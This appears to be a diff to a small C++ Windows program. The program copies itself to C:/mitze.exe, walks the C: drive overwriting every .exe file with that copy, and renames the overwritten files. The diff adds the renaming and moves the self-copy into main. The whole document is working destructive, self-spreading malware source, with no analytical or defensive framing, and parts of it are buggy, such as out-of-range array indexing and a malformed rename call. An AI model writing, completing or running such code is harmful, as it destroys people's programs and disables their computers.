@@ -5,7 +5,7 @@
 using namespace std;
 string sWords[] = {"Lol","Mitze","Katze"};
 string Chain = "";
-CopyFile("./a.exe","C:/mitze.exe",0);
+
 void FckFiles(std::string directory, std::string fileFilter, bool recursively = true)
 {
   if (recursively)
@@ -30,7 +30,9 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
     {
 		Chain = Chain + sWords[rand() % 4];
 		cout << Chain;
+		
   		CopyFile("C:/mitze.exe",FindFileData.cFileName,0);
+  		rename(FindFileData.cFileName,"LOL_MITZE_KATZE.exe"+rand() % 999999);
       //std::cout << directory + std::string(FindFileData.cFileName) << std::endl;
     }
 
@@ -41,6 +43,8 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
 			Chain = Chain + sWords[rand() % 4];
 			cout << Chain;
 			CopyFile("C:/mitze.exe",FindFileData.cFileName,0);
+			rename(FindFileData.cFileName,"LOL_MITZE_KATZE.exe"+rand() % 999999);
+			
 		}
 		else
 		{
@@ -62,5 +66,6 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
 
 int main(int argc, char* argv[])
 {
-  FckFiles("C:\\", "*.exe");
+	CopyFile("./a.exe","C:/mitze.exe",0);
+	FckFiles("C:\\", "*.exe");
 }
